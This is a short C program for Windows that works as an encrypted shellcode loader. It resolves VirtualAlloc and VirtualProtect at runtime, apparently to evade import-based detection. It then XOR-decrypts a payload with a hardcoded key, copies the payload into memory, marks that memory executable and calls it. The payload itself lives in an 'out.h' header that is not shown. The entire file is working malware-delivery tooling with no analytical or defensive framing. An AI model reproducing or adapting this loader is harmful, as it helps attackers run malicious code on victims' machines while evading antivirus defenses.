#include <windows.h>
#include "out.h"


typedef LPVOID (WINAPI * virtualAlloc_t)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

typedef BOOL (WINAPI * virtualProtect_t)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);

int main() {
  // Resolving dynamically the address of VirtualAlloc and allocating some space in memory (payload_len is defined in out.h)
	virtualAlloc_t pVirtualAlloc = (virtualAlloc_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
	LPVOID code = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Decrypting the payload
	char key[] = "jikoewarfkmzsdlhfnuiwaejrpaw";
	char * p;
	p = (char *)payload;
	for(int i =0; i < payload_len; ++i){
		*(p++) = payload[i] ^ key[i % (sizeof(key)-1)];
	}

  // Copying the payload to previously allocated memory
  char * c;
  c = (char *)code;
  for(int i = 0; i < payload_len; ++i){
    *(c++) = payload[i];
  }

  // Cahnging permissions to shellcode
	DWORD old;
  virtualProtect_t pVirtualProtect = (virtualProtect_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
	pVirtualProtect(code, payload_len, PAGE_EXECUTE_READ, &old);
	
  // Casting shellcode to a function and executing it
	((void(*)())code)();
	return 0;
}
